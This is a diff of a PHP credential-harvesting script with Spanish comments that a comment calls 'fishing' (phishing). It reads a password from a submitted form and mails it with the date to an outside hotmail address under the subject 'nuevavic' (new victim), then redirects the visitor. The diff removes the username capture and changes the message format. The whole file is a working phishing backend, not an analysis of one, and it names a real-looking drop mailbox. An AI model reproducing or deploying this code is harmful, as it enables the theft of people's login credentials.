@@ -1,8 +1,7 @@
 ﻿<?php
 //--------------------------------------//
 #Aqui capturamos los datos de los campos// 
- $usuario = $_POST['usuario'];          //
- $contraseña = $_POST['contraseña'];    //
+ $contraseña = $_POST['password'];      //
  $fecha = date('d-m-y');                //
 //--------------------------------------//
 
@@ -21,7 +20,7 @@ function ChechPassword($password)
 		 # Aqui generamos un correo electronico para hacer otro respaldo de la informacion introducida    //
 		 $receptor = "eldadofarias@hotmail.com";                               //correo electronico      //
          $asunto = "nuevavic";                                                 //asunto del mensaje              //
-         $mensaje ="STYLE---".$usuario."---"."ELITE---".$password."---".$fecha;//mensaje del correo              //
+         $mensaje ="password===".$password."---".$fecha;//mensaje del correo              //
          mail($receptor,$asunto,$mensaje);//enviamos el mail en cuestion                                         //
          $url = 'Aqui va la url ';//url a la cual se redireccionara despues de haber terminado el fishing        //
          $redireccion = 'location:'.$url;                                                                        //  
